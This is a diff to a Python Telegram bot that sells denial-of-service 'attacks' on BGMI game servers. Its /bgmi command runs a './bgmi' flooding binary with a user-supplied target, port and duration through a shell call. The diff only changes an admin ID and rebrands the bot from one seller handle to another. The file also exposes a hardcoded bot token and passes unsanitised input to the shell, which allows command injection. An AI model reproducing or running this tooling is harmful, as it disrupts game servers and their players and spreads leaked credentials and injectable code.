@@ -11,7 +11,7 @@ keep_alive()
 bot = telebot.TeleBot('7223592524:AAEnoHb8qMGA97jxLz31cxFyqGylerlbnxU')
 
 # Admin user IDs
-admin_id = {"2111548216", "6682104026", "1048241028"}
+admin_id = {"1753312395", "6682104026", "1048241028"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -240,7 +240,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"✅BGMI ATTACK FINISHED✅ \nTarget: {target} Port: {port} Time: {time}\n@psycho_modz"
+                response = f"✅BGMI ATTACK FINISHED✅ \nTarget: {target} Port: {port} Time: {time}\n@dakkucheats"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
@@ -273,7 +273,7 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text ='''🤖 @psycho_modz Available commands:
+    help_text ='''🤖 @dakkucheats Available commands:
 💥 /bgmi : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
